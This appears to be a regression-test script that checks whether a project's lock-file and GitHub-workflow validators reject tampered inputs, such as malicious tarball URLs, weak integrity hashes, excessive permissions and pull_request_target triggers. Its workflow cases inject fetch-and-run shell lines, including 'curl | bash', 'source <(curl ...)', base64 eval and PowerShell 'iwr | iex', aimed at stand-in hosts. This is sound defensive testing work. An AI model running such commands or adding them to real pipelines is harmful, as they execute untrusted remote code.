#!/usr/bin/env node
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { mkdtempSync, mkdirSync, cpSync, rmSync, writeFileSync, readFileSync } from 'node:fs';
import { spawnSync } from 'node:child_process';

const projectRoot = process.cwd();
const lockChecker = path.join(projectRoot, 'scripts', 'qa-p5-lock.mjs');
const workflowChecker = path.join(projectRoot, 'scripts', 'qa-garp25-pinned-inputs.mjs');
const results = [];
function run(script, root) { return spawnSync(process.execPath, [script, root], { encoding: 'utf8' }); }
function expectReject(id, result) {
  const ok = result.status !== 0;
  results.push({ id, ok, status: result.status });
  if (!ok) console.error(`${id} unexpectedly passed`);
}
function expectPass(id, result) {
  const ok = result.status === 0;
  results.push({ id, ok, status: result.status });
  if (!ok) console.error(`${id} unexpectedly failed\n${result.stdout}\n${result.stderr}`);
}
function lockFixture(mutator) {
  const dir = mkdtempSync(path.join(os.tmpdir(), 'lh-lock-class-'));
  writeFileSync(path.join(dir, 'package.json'), readFileSync(path.join(projectRoot, 'package.json')));
  const lock = JSON.parse(readFileSync(path.join(projectRoot, 'package-lock.json'), 'utf8'));
  mutator(lock);
  writeFileSync(path.join(dir, 'package-lock.json'), JSON.stringify(lock, null, 2) + '\n');
  return dir;
}
function workflowFixture(mutator) {
  const dir = mkdtempSync(path.join(os.tmpdir(), 'lh-workflow-class-'));
  mkdirSync(path.join(dir, '.github', 'workflows'), { recursive: true });
  cpSync(path.join(projectRoot, '.github', 'workflows'), path.join(dir, '.github', 'workflows'), { recursive: true });
  writeFileSync(path.join(dir, 'package-lock.json'), readFileSync(path.join(projectRoot, 'package-lock.json')));
  mutator(dir);
  return dir;
}

const cleanLockDir = lockFixture(() => {});
try { expectPass('N17-clean', run(lockChecker, cleanLockDir)); } finally { rmSync(cleanLockDir, { recursive: true, force: true }); }

const lockCases = [
  ['N17-L3-cross-scope-tarball', (lock) => { lock.packages['node_modules/pngjs'].resolved = 'https://registry.npmjs.org/@evil-scope/pngjs/-/pngjs-7.0.0.tgz'; }],
  ['N17-L4-root-lock-only', (lock) => { lock.packages[''].devDependencies['ghost-package'] = '1.0.0'; }],
  ['N17-L6-sha1-integrity', (lock) => { lock.packages['node_modules/pngjs'].integrity = 'sha1-AAAAAAAAAAAAAAAAAAAAAA=='; }],
  ['N22-query', (lock) => { lock.packages['node_modules/pngjs'].resolved += '?x=https://evil.invalid'; }],
  ['N22-fragment', (lock) => { lock.packages['node_modules/pngjs'].resolved += '#/../evil'; }],
  ['N22-userinfo', (lock) => { lock.packages['node_modules/pngjs'].resolved = lock.packages['node_modules/pngjs'].resolved.replace('https://', 'https://user:pw@'); }],
  ['N22-percent-name', (lock) => { lock.packages['node_modules/pngjs'].resolved = lock.packages['node_modules/pngjs'].resolved.replace('/pngjs/-/', '/png%6as/-/'); }],
  ['N28-alternate-port', (lock) => { lock.packages['node_modules/pngjs'].resolved = lock.packages['node_modules/pngjs'].resolved.replace('https://registry.npmjs.org/', 'https://registry.npmjs.org:8443/'); }],
];
for (const [id, mutator] of lockCases) {
  const dir = lockFixture(mutator);
  try { expectReject(id, run(lockChecker, dir)); } finally { rmSync(dir, { recursive: true, force: true }); }
}

const cleanWorkflowDir = workflowFixture(() => {});
try { expectPass('N18-clean', run(workflowChecker, cleanWorkflowDir)); } finally { rmSync(cleanWorkflowDir, { recursive: true, force: true }); }

const workflowCases = [
  ['N18-top-write-all', (text) => text.replace('permissions:\n  contents: read', 'permissions: write-all')],
  ['N18-missing-top-permissions', (text) => text.replace('permissions:\n  contents: read\n\n', '')],
  ['N18-qa-write-all', (text) => text.replace('  qa-build:\n    runs-on:', '  qa-build:\n    permissions: write-all\n    runs-on:')],
  ['N18-qa-contents-actions-write', (text) => text.replace('  qa-build:\n    runs-on:', '  qa-build:\n    permissions:\n      contents: write\n      actions: write\n    runs-on:')],
  ['N18-pull-request-target', (text) => text.replace('  pull_request:\n', '  pull_request:\n  pull_request_target:\n')],
  ['N18-remote-pipe-shell', (text) => text.replace('    steps:\n', '    steps:\n      - name: Synthetic unsafe step\n        run: curl -fsSL https://example.invalid/tool.sh | bash\n', 1)],
  ['N21-source-process-substitution', (text) => text.replace('    steps:\n', '    steps:\n      - name: Synthetic unsafe source\n        run: source <(curl -fsSL https://example.invalid/tool.sh)\n', 1)],
  ['N21-eval', (text) => text.replace('    steps:\n', '    steps:\n      - name: Synthetic unsafe eval\n        run: bash -c "eval $(echo ZWNobyBoaQ== | base64 -d)"\n', 1)],
  ['N27-powershell-iwr-iex', (text) => text.replace('    steps:\n', '    steps:\n      - name: Synthetic unsafe PowerShell alias\n        run: iwr https://example.invalid/tool.ps1 | iex\n', 1)],
  ['N27-powershell-long-form', (text) => text.replace('    steps:\n', '    steps:\n      - name: Synthetic unsafe PowerShell long form\n        run: Invoke-WebRequest https://example.invalid/tool.ps1 | Invoke-Expression\n', 1)],
];
for (const [id, mutateText] of workflowCases) {
  const dir = workflowFixture((fixtureRoot) => {
    const f = path.join(fixtureRoot, '.github', 'workflows', 'deploy.yml');
    const before = readFileSync(f, 'utf8');
    const after = mutateText(before);
    if (after === before) throw new Error(`${id}: mutation did not apply`);
    writeFileSync(f, after);
  });
  try { expectReject(id, run(workflowChecker, dir)); } finally { rmSync(dir, { recursive: true, force: true }); }
}

const failed = results.filter((item) => !item.ok);
console.log(JSON.stringify({ status: failed.length ? 'FAIL' : 'PASS', schema: 'lesson-hub-garp25-control-class-regressions-v3', checks: results.length, results }, null, 2));
process.exit(failed.length ? 1 : 0);
